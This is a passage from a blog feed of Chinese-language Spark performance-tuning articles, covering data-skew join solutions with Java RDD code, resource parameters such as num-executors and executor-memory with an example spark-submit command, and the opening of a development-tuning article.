class="line">            <span class="keyword">public</span> Tuple2&lt;Long, Long&gt; <span class="title function_">call</span><span class="params">(Tuple2&lt;Long, String&gt; tuple)</span></span><br><span class="line">                    <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Tuple2</span>&lt;Long, Long&gt;(tuple._1, <span class="number">1L</span>);</span><br><span class="line">            &#125;     </span><br><span class="line">        &#125;);</span><br><span class="line">JavaPairRDD&lt;Long, Long&gt; countedSampledRDD = mappedSampledRDD.reduceByKey(</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Function2</span>&lt;Long, Long, Long&gt;() &#123;</span><br><span class="line">            <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> Long <span class="title function_">call</span><span class="params">(Long v1, Long v2)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                <span class="keyword">return</span> v1 + v2;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">JavaPairRDD&lt;Long, Long&gt; reversedSampledRDD = countedSampledRDD.mapToPair( </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">PairFunction</span>&lt;Tuple2&lt;Long,Long&gt;, Long, Long&gt;() &#123;</span><br><span class="line">            <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> Tuple2&lt;Long, Long&gt; <span class="title function_">call</span><span class="params">(Tuple2&lt;Long, Long&gt; tuple)</span></span><br><span class="line">                    <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Tuple2</span>&lt;Long, Long&gt;(tuple._2, tuple._1);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"><span class="keyword">final</span> <span class="type">Long</span> <span class="variable">skewedUserid</span> <span class="operator">=</span> reversedSampledRDD.sortByKey(<span class="literal">false</span>).take(<span class="number">1</span>).get(<span class="number">0</span>)._2;</span><br><span class="line">  </span><br><span class="line"><span class="comment">// 从rdd1中分拆出导致数据倾斜的key，形成独立的RDD。</span></span><br><span class="line">JavaPairRDD&lt;Long, String&gt; skewedRDD = rdd1.filter(</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Function</span>&lt;Tuple2&lt;Long,String&gt;, Boolean&gt;() &#123;</span><br><span class="line">            <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> Boolean <span class="title function_">call</span><span class="params">(Tuple2&lt;Long, String&gt; tuple)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                <span class="keyword">return</span> tuple._1.equals(skewedUserid);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"><span class="comment">// 从rdd1中分拆出不导致数据倾斜的普通key，形成独立的RDD。</span></span><br><span class="line">JavaPairRDD&lt;Long, String&gt; commonRDD = rdd1.filter(</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Function</span>&lt;Tuple2&lt;Long,String&gt;, Boolean&gt;() &#123;</span><br><span class="line">            <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> Boolean <span class="title function_">call</span><span class="params">(Tuple2&lt;Long, String&gt; tuple)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                <span class="keyword">return</span> !tuple._1.equals(skewedUserid);</span><br><span class="line">            &#125; </span><br><span class="line">        &#125;);</span><br><span class="line">  </span><br><span class="line"><span class="comment">// rdd2，就是那个所有key的分布相对较为均匀的rdd。</span></span><br><span class="line"><span class="comment">// 这里将rdd2中，前面获取到的key对应的数据，过滤出来，分拆成单独的rdd，并对rdd中的数据使用flatMap算子都扩容100倍。</span></span><br><span class="line"><span class="comment">// 对扩容的每条数据，都打上0～100的前缀。</span></span><br><span class="line">JavaPairRDD&lt;String, Row&gt; skewedRdd2 = rdd2.filter(</span><br><span class="line">         <span class="keyword">new</span> <span class="title class_">Function</span>&lt;Tuple2&lt;Long,Row&gt;, Boolean&gt;() &#123;</span><br><span class="line">            <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> Boolean <span class="title function_">call</span><span class="params">(Tuple2&lt;Long, Row&gt; tuple)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                <span class="keyword">return</span> tuple._1.equals(skewedUserid);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).flatMapToPair(<span class="keyword">new</span> <span class="title class_">PairFlatMapFunction</span>&lt;Tuple2&lt;Long,Row&gt;, String, Row&gt;() &#123;</span><br><span class="line">            <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> Iterable&lt;Tuple2&lt;String, Row&gt;&gt; <span class="title function_">call</span><span class="params">(</span></span><br><span class="line"><span class="params">                    Tuple2&lt;Long, Row&gt; tuple)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                <span class="type">Random</span> <span class="variable">random</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">                List&lt;Tuple2&lt;String, Row&gt;&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Tuple2&lt;String, Row&gt;&gt;();</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">                    list.add(<span class="keyword">new</span> <span class="title class_">Tuple2</span>&lt;String, Row&gt;(i + <span class="string">&quot;_&quot;</span> + tuple._1, tuple._2));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> list;</span><br><span class="line">            &#125;</span><br><span class="line">              </span><br><span class="line">        &#125;);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 将rdd1中分拆出来的导致倾斜的key的独立rdd，每条数据都打上100以内的随机前缀。</span></span><br><span class="line"><span class="comment">// 然后将这个rdd1中分拆出来的独立rdd，与上面rdd2中分拆出来的独立rdd，进行join。</span></span><br><span class="line">JavaPairRDD&lt;Long, Tuple2&lt;String, Row&gt;&gt; joinedRDD1 = skewedRDD.mapToPair(</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">PairFunction</span>&lt;Tuple2&lt;Long,String&gt;, String, String&gt;() &#123;</span><br><span class="line">            <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> Tuple2&lt;String, String&gt; <span class="title function_">call</span><span class="params">(Tuple2&lt;Long, String&gt; tuple)</span></span><br><span class="line">                    <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                <span class="type">Random</span> <span class="variable">random</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">                <span class="type">int</span> <span class="variable">prefix</span> <span class="operator">=</span> random.nextInt(<span class="number">100</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Tuple2</span>&lt;String, String&gt;(prefix + <span class="string">&quot;_&quot;</span> + tuple._1, tuple._2);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        .join(skewedUserid2infoRDD)</span><br><span class="line">        .mapToPair(<span class="keyword">new</span> <span class="title class_">PairFunction</span>&lt;Tuple2&lt;String,Tuple2&lt;String,Row&gt;&gt;, Long, Tuple2&lt;String, Row&gt;&gt;() &#123;</span><br><span class="line">                        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">                        <span class="meta">@Override</span></span><br><span class="line">                        <span class="keyword">public</span> Tuple2&lt;Long, Tuple2&lt;String, Row&gt;&gt; <span class="title function_">call</span><span class="params">(</span></span><br><span class="line"><span class="params">                            Tuple2&lt;String, Tuple2&lt;String, Row&gt;&gt; tuple)</span></span><br><span class="line">                            <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                            <span class="type">long</span> <span class="variable">key</span> <span class="operator">=</span> Long.valueOf(tuple._1.split(<span class="string">&quot;_&quot;</span>)[<span class="number">1</span>]);</span><br><span class="line">                            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Tuple2</span>&lt;Long, Tuple2&lt;String, Row&gt;&gt;(key, tuple._2);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 将rdd1中分拆出来的包含普通key的独立rdd，直接与rdd2进行join。</span></span><br><span class="line">JavaPairRDD&lt;Long, Tuple2&lt;String, Row&gt;&gt; joinedRDD2 = commonRDD.join(rdd2);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 将倾斜key join后的结果与普通key join后的结果，uinon起来。</span></span><br><span class="line"><span class="comment">// 就是最终的join结果。</span></span><br><span class="line">JavaPairRDD&lt;Long, Tuple2&lt;String, Row&gt;&gt; joinedRDD = joinedRDD1.union(joinedRDD2);</span><br></pre></td></tr></table></figure><h2 id="解决方案七：使用随机前缀和扩容RDD进行join"><a href="#解决方案七：使用随机前缀和扩容RDD进行join" class="headerlink" title="解决方案七：使用随机前缀和扩容RDD进行join"></a>解决方案七：使用随机前缀和扩容RDD进行join</h2><p><strong>方案适用场景：</strong>如果在进行join操作时，RDD中有大量的key导致数据倾斜，那么进行分拆key也没什么意义，此时就只能使用最后一种方案来解决问题了。</p><p><strong>方案实现思路：</strong> * 该方案的实现思路基本和“解决方案六”类似，首先查看RDD&#x2F;Hive表中的数据分布情况，找到那个造成数据倾斜的RDD&#x2F;Hive表，比如有多个key都对应了超过1万条数据。 * 然后将该RDD的每条数据都打上一个n以内的随机前缀。 * 同时对另外一个正常的RDD进行扩容，将每条数据都扩容成n条数据，扩容出来的每条数据都依次打上一个0~n的前缀。 * 最后将两个处理后的RDD进行join即可。</p><p><strong>方案实现原理：</strong>将原先一样的key通过附加随机前缀变成不一样的key，然后就可以将这些处理后的“不同key”分散到多个task中去处理，而不是让一个task处理大量的相同key。该方案与“解决方案六”的不同之处就在于，上一种方案是尽量只对少数倾斜key对应的数据进行特殊处理，由于处理过程需要扩容RDD，因此上一种方案扩容RDD后对内存的占用并不大；而这一种方案是针对有大量倾斜key的情况，没法将部分key拆分出来进行单独处理，因此只能对整个RDD进行数据扩容，对内存资源要求很高。</p><p><strong>方案优点：</strong>对join类型的数据倾斜基本都可以处理，而且效果也相对比较显著，性能提升效果非常不错。</p><p><strong>方案缺点：</strong>该方案更多的是缓解数据倾斜，而不是彻底避免数据倾斜。而且需要对整个RDD进行扩容，对内存资源要求很高。</p><p><strong>方案实践经验：</strong>曾经开发一个数据需求的时候，发现一个join导致了数据倾斜。优化之前，作业的执行时间大约是60分钟左右；使用该方案优化之后，执行时间缩短到10分钟左右，性能提升了6倍。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 首先将其中一个key分布相对较为均匀的RDD膨胀100倍。</span></span><br><span class="line">JavaPairRDD&lt;String, Row&gt; expandedRDD = rdd1.flatMapToPair(</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">PairFlatMapFunction</span>&lt;Tuple2&lt;Long,Row&gt;, String, Row&gt;() &#123;</span><br><span class="line">            <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> Iterable&lt;Tuple2&lt;String, Row&gt;&gt; <span class="title function_">call</span><span class="params">(Tuple2&lt;Long, Row&gt; tuple)</span></span><br><span class="line">                    <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                List&lt;Tuple2&lt;String, Row&gt;&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Tuple2&lt;String, Row&gt;&gt;();</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">                    list.add(<span class="keyword">new</span> <span class="title class_">Tuple2</span>&lt;String, Row&gt;(<span class="number">0</span> + <span class="string">&quot;_&quot;</span> + tuple._1, tuple._2));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> list;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">  </span><br><span class="line"><span class="comment">// 其次，将另一个有数据倾斜key的RDD，每条数据都打上100以内的随机前缀。</span></span><br><span class="line">JavaPairRDD&lt;String, String&gt; mappedRDD = rdd2.mapToPair(</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">PairFunction</span>&lt;Tuple2&lt;Long,String&gt;, String, String&gt;() &#123;</span><br><span class="line">            <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> Tuple2&lt;String, String&gt; <span class="title function_">call</span><span class="params">(Tuple2&lt;Long, String&gt; tuple)</span></span><br><span class="line">                    <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                <span class="type">Random</span> <span class="variable">random</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">                <span class="type">int</span> <span class="variable">prefix</span> <span class="operator">=</span> random.nextInt(<span class="number">100</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Tuple2</span>&lt;String, String&gt;(prefix + <span class="string">&quot;_&quot;</span> + tuple._1, tuple._2);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">  </span><br><span class="line"><span class="comment">// 将两个处理后的RDD进行join即可。</span></span><br><span class="line">JavaPairRDD&lt;String, Tuple2&lt;String, Row&gt;&gt; joinedRDD = mappedRDD.join(expandedRDD);</span><br></pre></td></tr></table></figure><h2 id="解决方案八：多种方案组合使用"><a href="#解决方案八：多种方案组合使用" class="headerlink" title="解决方案八：多种方案组合使用"></a>解决方案八：多种方案组合使用</h2><p>在实践中发现，很多情况下，如果只是处理较为简单的数据倾斜场景，那么使用上述方案中的某一种基本就可以解决。但是如果要处理一个较为复杂的数据倾斜场景，那么可能需要将多种方案组合起来使用。比如说，我们针对出现了多个数据倾斜环节的Spark作业，可以先运用解决方案一和二，<strong>预处理</strong>一部分数据，并<strong>过滤</strong>一部分数据来缓解；其次可以对某些shuffle操作<strong>提升并行度</strong>，优化其性能；最后还可以针对不同的聚合或join操作，选择一种方案来优化其性能。大家需要对这些方案的思路和原理都透彻理解之后，在实践中根据各种不同的情况，灵活运用多种方案，来解决自己的数据倾斜问题。</p>]]></content>
      
      
      <categories>
          
          <category> Spark </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spark </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spark 性能调优——资源调优</title>
      <link href="/blog/5f7211d0.html/"/>
      <url>/blog/5f7211d0.html/</url>
      
        <content type="html"><![CDATA[<h2 id="调优概述"><a href="#调优概述" class="headerlink" title="调优概述"></a>调优概述</h2><p>在开发完Spark作业之后，就该为作业配置合适的资源了。Spark的资源参数，基本都可以在spark-submit命令中作为参数设置。很多Spark初学者，通常不知道该设置哪些必要的参数，以及如何设置这些参数，最后就只能胡乱设置，甚至压根儿不设置。资源参数设置的不合理，可能会导致没有充分利用集群资源，作业运行会极其缓慢；或者设置的资源过大，队列没有足够的资源来提供，进而导致各种异常。总之，无论是哪种情况，都会导致Spark作业的运行效率低下，甚至根本无法运行。因此我们必须对Spark作业的资源使用原理有一个清晰的认识，并知道在Spark作业运行过程中，有哪些资源参数是可以设置的，以及如何设置合适的参数值。</p><h2 id="Spark作业基本运行原理"><a href="#Spark作业基本运行原理" class="headerlink" title="Spark作业基本运行原理"></a>Spark作业基本运行原理</h2><p><img src="/blog/5f7211d0.html/1648805615385-560485a2-b665-4472-a0b0-41dfc9b6a557.png" alt="img"></p><p>详细原理见上图。我们使用spark-submit提交一个Spark作业之后，这个作业就会启动一个对应的Driver进程。根据你使用的部署模式（deploy-mode）不同，Driver进程可能在本地启动，也可能在集群中某个工作节点上启动。Driver进程本身会根据我们设置的参数，占有一定数量的内存和CPU core。而Driver进程要做的第一件事情，就是向集群管理器（可以是Spark Standalone集群，也可以是其他的资源管理集群，美团•大众点评使用的是YARN作为资源管理集群）申请运行Spark作业需要使用的资源，这里的资源指的就是Executor进程。YARN集群管理器会根据我们为Spark作业设置的资源参数，在各个工作节点上，启动一定数量的Executor进程，每个Executor进程都占有一定数量的内存和CPU core。</p><p>在申请到了作业执行所需的资源之后，Driver进程就会开始调度和执行我们编写的作业代码了。Driver进程会将我们编写的Spark作业代码分拆为多个stage，每个stage执行一部分代码片段，并为每个stage创建一批task，然后将这些task分配到各个Executor进程中执行。task是最小的计算单元，负责执行一模一样的计算逻辑（也就是我们自己编写的某个代码片段），只是每个task处理的数据不同而已。一个stage的所有task都执行完毕之后，会在各个节点本地的磁盘文件中写入计算中间结果，然后Driver就会调度运行下一个stage。下一个stage的task的输入数据就是上一个stage输出的中间结果。如此循环往复，直到将我们自己编写的代码逻辑全部执行完，并且计算完所有的数据，得到我们想要的结果为止。</p><p>Spark是根据shuffle类算子来进行stage的划分。如果我们的代码中执行了某个shuffle类算子（比如reduceByKey、join等），那么就会在该算子处，划分出一个stage界限来。可以大致理解为，shuffle算子执行之前的代码会被划分为一个stage，shuffle算子执行以及之后的代码会被划分为下一个stage。因此一个stage刚开始执行的时候，它的每个task可能都会从上一个stage的task所在的节点，去通过网络传输拉取需要自己处理的所有key，然后对拉取到的所有相同的key使用我们自己编写的算子函数执行聚合操作（比如reduceByKey()算子接收的函数）。这个过程就是shuffle。</p><p>当我们在代码中执行了cache&#x2F;persist等持久化操作时，根据我们选择的持久化级别的不同，每个task计算出来的数据也会保存到Executor进程的内存或者所在节点的磁盘文件中。</p><p>因此Executor的内存主要分为三块：第一块是让task执行我们自己编写的代码时使用，默认是占Executor总内存的20%；第二块是让task通过shuffle过程拉取了上一个stage的task的输出后，进行聚合等操作时使用，默认也是占Executor总内存的20%；第三块是让RDD持久化时使用，默认占Executor总内存的60%。</p><p>task的执行速度是跟每个Executor进程的CPU core数量有直接关系的。一个CPU core同一时间只能执行一个线程。而每个Executor进程上分配到的多个task，都是以每个task一条线程的方式，多线程并发运行的。如果CPU core数量比较充足，而且分配到的task数量比较合理，那么通常来说，可以比较快速和高效地执行完这些task线程。</p><p>以上就是Spark作业的基本运行原理的说明，大家可以结合上图来理解。理解作业基本原理，是我们进行资源参数调优的基本前提。</p><h2 id="资源参数调优"><a href="#资源参数调优" class="headerlink" title="资源参数调优"></a>资源参数调优</h2><p>了解完了Spark作业运行的基本原理之后，对资源相关的参数就容易理解了。所谓的Spark资源参数调优，其实主要就是对Spark运行过程中各个使用资源的地方，通过调节各种参数，来优化资源使用的效率，从而提升Spark作业的执行性能。以下参数就是Spark中主要的资源参数，每个参数都对应着作业运行原理中的某个部分，我们同时也给出了一个调优的参考值。</p><h3 id="num-executors"><a href="#num-executors" class="headerlink" title="num-executors"></a>num-executors</h3><ul><li>参数说明：该参数用于设置Spark作业总共要用多少个Executor进程来执行。Driver在向YARN集群管理器申请资源时，YARN集群管理器会尽可能按照你的设置来在集群的各个工作节点上，启动相应数量的Executor进程。这个参数非常之重要，如果不设置的话，默认只会给你启动少量的Executor进程，此时你的Spark作业的运行速度是非常慢的。</li><li>参数调优建议：每个Spark作业的运行一般设置<strong>50~100个左右的Executor进程比较合适</strong>，设置太少或太多的Executor进程都不好。设置的太少，无法充分利用集群资源；<strong>设置的太多的话，大部分队列可能无法给予充分的资源</strong>。</li></ul><h3 id="executor-memory"><a href="#executor-memory" class="headerlink" title="executor-memory"></a>executor-memory</h3><ul><li>参数说明：该参数用于设置每个Executor进程的内存。Executor内存的大小，很多时候直接决定了Spark作业的性能，而且跟常见的JVM OOM异常，也有直接的关联。</li><li>参数调优建议：<strong>每个Executor进程的内存设置4G~8G较为合适</strong>。但是这只是一个参考值，具体的设置还是得根据不同部门的资源队列来定。可以看看自己<strong>团队的资源队列的最大内存限制是多少</strong>，<strong>num-executors乘以executor-memory，是不能超过队列的最大内存量的。</strong>此外，如果你是跟团队里其他人共享这个资源队列，那么申请的内存量最好不要超过资源队列<strong>最大总内存的1&#x2F;3~1&#x2F;2</strong>，避免你自己的Spark作业占用了队列所有的资源，导致别的同学的作业无法运行。</li></ul><h3 id="executor-cores"><a href="#executor-cores" class="headerlink" title="executor-cores"></a>executor-cores</h3><ul><li>参数说明：该参数用于设置每个<strong>Executor进程的CPU core数量</strong>。这个参数决定了<strong>每个Executor进程并行执行task线程的能力</strong>。因为<strong>每个CPU core同一时间只能执行一个task线程</strong>，因此每个Executor进程的CPU core数量越多，越能够快速地执行完分配给自己的所有task线程。</li><li>参数调优建议：<strong>Executor的CPU core数量设置为2~4个较为合适</strong>。同样得根据不同部门的资源队列来定，可以看看<strong>自己的资源队列的最大CPU core限制是多少</strong>，再依据设置的Executor数量，来决定每个Executor进程可以分配到几个CPU core。同样建议，如果是跟他人共享这个队列，那么<strong>num-executors * executor-cores不要超过队列总CPU core的1&#x2F;3~1&#x2F;2左右比较合适</strong>，也是避免影响其他同学的作业运行。</li></ul><h3 id="driver-memory"><a href="#driver-memory" class="headerlink" title="driver-memory"></a>driver-memory</h3><ul><li>参数说明：该参数用于设置Driver进程的内存。</li><li>参数调优建议：Driver的内存通常来说不设置，或者设置<strong>1G左右应该就够了</strong>。唯一需要注意的一点是，如果<strong>需要使用collect算子将RDD的数据全部拉取到Driver上进行处理，那么必须确保Driver的内存足够大</strong>，否则会出现OOM内存溢出的问题。</li></ul><h3 id="spark-default-parallelism"><a href="#spark-default-parallelism" class="headerlink" title="spark.default.parallelism"></a>spark.default.parallelism</h3><ul><li>参数说明：该参数用于设置每个stage的默认task数量。这个参数极为重要，如果<strong>不设置可能会直接影响你的Spark作业性能</strong>。</li><li>参数调优建议：<strong>Spark作业的默认task数量为500~1000个较为合适。</strong>很多同学常犯的一个错误就是不去设置这个参数，那么此时就会导致Spark自己根据底层HDFS的block数量来设置task的数量，默认是一个HDFS block对应一个task。通常来说，Spark默认设置的数量是偏少的（比如就几十个task），<strong>如果task数量偏少的话，就会导致你前面设置好的Executor的参数都前功尽弃</strong>。试想一下，无论你的Executor进程有多少个，内存和CPU有多大，但是task只有1个或者10个，<strong>那么90%的Executor进程可能根本就没有task执行</strong>，<strong>也就是白白浪费了资源</strong>！因此Spark官网建议的设置原则是，设置该参数为<strong>num-executors * executor-cores的2~3倍较为合适</strong>，比如Executor的总CPU core数量为300个，那么设置1000个task是可以的，此时可以充分地利用Spark集群的资源。</li></ul><h3 id="spark-storage-memoryFraction"><a href="#spark-storage-memoryFraction" class="headerlink" title="spark.storage.memoryFraction"></a>spark.storage.memoryFraction</h3><ul><li>参数说明：该参数用于设置<strong>RDD持久化数据</strong>在Executor内存中<strong>能占的比例</strong>，默认是<strong>0.6</strong>。也就是说，默认Executor 60%的内存，可以用来保存持久化的RDD数据。根据你选择的不同的持久化策略，如果内存不够时，可能数据就不会持久化，或者数据会写入磁盘。</li><li>参数调优建议：如果Spark作业中，<strong>有较多的RDD持久化操作，该参数的值可以适当提高一些，保证持久化的数据能够容纳在内存中</strong>。避免内存不够缓存所有的数据，导致数据只能写入磁盘中，降低了性能。但是<strong>如果Spark作业中的shuffle类操作比较多，而持久化操作比较少，那么这个参数的值适当降低一些比较合适</strong>。此外，如果发现作业由于频繁的gc导致运行缓慢（通过spark web ui可以观察到作业的gc耗时），意味着task执行用户代码的内存不够用，那么同样建议调低这个参数的值。</li></ul><h3 id="spark-shuffle-memoryFraction"><a href="#spark-shuffle-memoryFraction" class="headerlink" title="spark.shuffle.memoryFraction"></a>spark.shuffle.memoryFraction</h3><ul><li>参数说明：该参数用于设置shuffle过程中一个task拉取到上个stage的task的输出后，进行聚合操作时能够使用的Executor内存的比例，<strong>默认是0.2</strong>。也就是说，<strong>Executor默认只有20%的内存用来进行该操作</strong>。shuffle操作在进行聚合时，如果发现使用的内存超出了这个20%的限制，那么多余的数据就会溢写到磁盘文件中去，此时就会极大地降低性能。</li><li>参数调优建议：<strong>如果Spark作业中的RDD持久化操作较少，shuffle操作较多时，建议降低持久化操作的内存占比，提高shuffle操作的内存占比比例，避免shuffle过程中数据过多时内存不够用，必须溢写到磁盘上，降低了性能。</strong>此外，如果发现作业由于频繁的gc导致运行缓慢，意味着task执行用户代码的内存不够用，那么同样建议调低这个参数的值。</li></ul><p>资源参数的调优，没有一个固定的值，需要同学们根据自己的实际情况（包括Spark作业中的shuffle操作数量、RDD持久化操作数量以及spark web ui中显示的作业gc情况），同时参考本篇文章中给出的原理以及调优建议，合理地设置上述参数。</p><h2 id="资源参数参考示例"><a href="#资源参数参考示例" class="headerlink" title="资源参数参考示例"></a>资源参数参考示例</h2><p>以下是一份spark-submit命令的示例，大家可以参考一下，并根据自己的实际情况进行调节：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">./bin/spark-submit \</span><br><span class="line">--master yarn-cluster \</span><br><span class="line">--num-executors 100 \</span><br><span class="line">--executor-memory 6G \</span><br><span class="line">--executor-cores 4 \</span><br><span class="line">--driver-memory 1G \</span><br><span class="line">--conf spark.default.parallelism=1000 \</span><br><span class="line">--conf spark.storage.memoryFraction=0.5 \</span><br><span class="line">--conf spark.shuffle.memoryFraction=0.3 \</span><br></pre></td></tr></table></figure><p>根据实践经验来看，大部分Spark作业经过本次基础篇所讲解的开发调优与资源调优之后，一般都能以较高的性能运行了，足以满足我们的需求。但是在不同的生产环境和项目背景下，可能会遇到其他更加棘手的问题（比如各种数据倾斜），也可能会遇到更高的性能要求。为了应对这些挑战，需要使用更高级的技巧来处理这类问题。</p>]]></content>
      
      
      <categories>
          
          <category> Spark </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spark </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spark 性能调优——开发调优</title>
      <link href="/blog/b222527c.html/"/>
      <url>/blog/b222527c.html/</url>
      
        <content type="html"><![CDATA[<p>大多数spark作业的性能主要就是消耗了shuffle过程，因为该环节包含了<strong>大量的磁盘IO、序列化、网络数据传输</strong>等操作。</p><p>影响一个Spark作业性能的因素，主要还是代码开发、资源参数以及数据倾斜，shuffle调优只能在整个Spark的性能调优中占到一小部分而已。</p><p>开发调优、资源调优、数据倾斜调优、shuffle调优；</p><p>Spark基本开发原则，包括：RDD lineage设计、算子的合理使用、特殊操作的优化</p><h2 id="原则一：避免创建重复的RDD"><a href="#原则一：避免创建重复的RDD" class="headerlink" title="原则一：避免创建重复的RDD"></a>原则一：避免创建重复的RDD</h2><p><strong>对于同一份数据，只应该创建一个RDD，不能创建多个RDD来代表同一份数据。****对多次使用的RDD进行持久化</strong></p><p>一些Spark初学者在刚开始开发Spark作业时，或者是有经验的工程师在开发RDD lineage极其冗长的Spark作业时，可能会忘了自己之前对于某一份数据已经创建过一个RDD了，从而导致对于同一份数据，创建了多个RDD。这就意味着，我们的Spark作业会进行多次重复计算来创建多个代表相同数据的RDD，进而增加了作业的性能开销。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 